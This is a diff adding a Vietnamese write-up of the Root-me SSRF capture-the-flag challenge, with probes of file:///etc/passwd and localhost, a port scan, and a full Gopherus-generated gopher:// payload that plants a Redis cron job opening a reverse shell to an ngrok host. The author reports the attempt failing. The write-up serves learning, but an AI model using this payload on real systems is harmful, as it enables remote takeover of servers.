@@ -40,4 +40,57 @@ Tham khảo: <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-sid
 - Giới hạn truy cập máy chủ cục bộ, sử dụng cấu hình máy chủ hợp lý.
 - Sử dụng tường lửa, thư viện bảo mật và thường xuyên cập nhật chúng.
 
-#Root-me
+# Root-me
+## Server Side Request Forgery
+Link: https://www.root-me.org/en/Challenges/Web-Server/Server-Side-Request-Forgery
+
+![image](https://user-images.githubusercontent.com/92881216/229118568-98447fe1-187c-47b2-8e71-deb5e1044c88.png)
+
+Nhìn sơ qua thì web có 1 input url:
+
+![image](https://user-images.githubusercontent.com/92881216/229118790-585c2ee8-144d-4c5f-b177-42feabf035b8.png)
+
+Nhập thử với `https://www.google.com/` thì :
+
+![image](https://user-images.githubusercontent.com/92881216/229119047-c4c6829d-33c3-4638-98b9-3e7b38490972.png)
+
+Như vậy có thể web dùng curl để crawl lại web được nhập từ url. Tiếp tục thử với `file:///etc/passwd`:
+
+![image](https://user-images.githubusercontent.com/92881216/229119398-f4062355-78d3-415b-b356-d9c87e3693ea.png)
+
+Như vậy web có vẻ không filter gì, nhưng trong `/etc/passwd` cũng không có gì, tiếp tục thử với `http://localhost`
+
+![image](https://user-images.githubusercontent.com/92881216/229119635-33516819-24a3-4445-9434-936e3f199173.png)
+
+Như vậy nó có thể yêu cầu đến chính server nó. Mặt khác, SSRF có thể khai thác qua các cổng mở khác có thể dấn đến RCE, vì vậy dùng burp suite để test toàn bộ cổng với payload: `http://localhost:x` với x từ 1 -> 65535 và nhận thấy :
+
+
+Như vậy cổng 6379 được mở, đây là cổng mặc định của `redis`.<br>
+> Redis 6379 là cổng mặc định mà Redis nghe các kết nối. Nó là một kho lưu trữ cấu trúc dữ liệu trong bộ nhớ phổ biến được sử dụng làm cơ sở dữ liệu, bộ đệm và trình môi giới tin nhắn. Đây là một cơ sở dữ liệu nhanh, có thể mở rộng và đáng tin cậy được sử dụng bởi nhiều trang web và ứng dụng phổ biến.
+
+Lanh quanh 1 lúc trên mạng tìm được tool <a href="https://github.com/tarunkant/Gopherus" >Gopherus</a>. Đây là tool tạo payload thông qua protocol `gopher` dùng để khai thác các dịch vụ như: mysql, redis, smtp,...
+
+Sau 1 hồi tìm hiểu thì đây là cách khai thác:
+- Đầu tiên dùng `ngrok` với command `ngrok tcp 1235` để tạo ra 1 tunel từ máy đến internet qua cổng 1235 (Đây là cổng để netcat nghe reverse shell) : 
+
+![image](https://user-images.githubusercontent.com/92881216/229121608-cecd01ed-8214-4641-be29-06aa60d12811.png)
+
+- Tiếp theo, dùng `Gopherus` tạo payload reverse shell với ip vừa tạo từ `ngrok`:
+
+![image](https://user-images.githubusercontent.com/92881216/229122051-08bdffd2-3422-4427-9d5e-b52b474ca55c.png)
+
+Tuy nhiên mặc định tool tạo ra có cổng 1234 nên cần đổi nó sang cổng đã tạo ở `ngrok` (ở đây là: 16632)
+
+Payload khi đó là:
+```
+gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2472%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/0.tcp.ap.ngrok.io/16632%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
+```
+- Bây giờ chỉ việc dùng `nc -lvp 1235` rồi gửi payload thôi...
+
+Mặc dù thử rất nhiều lần nhưng em vẫn bị lỗi :
+
+![image](https://user-images.githubusercontent.com/92881216/229124019-26a57794-41a9-4685-8a5b-53ed77b445fe.png)
+
+
+
+
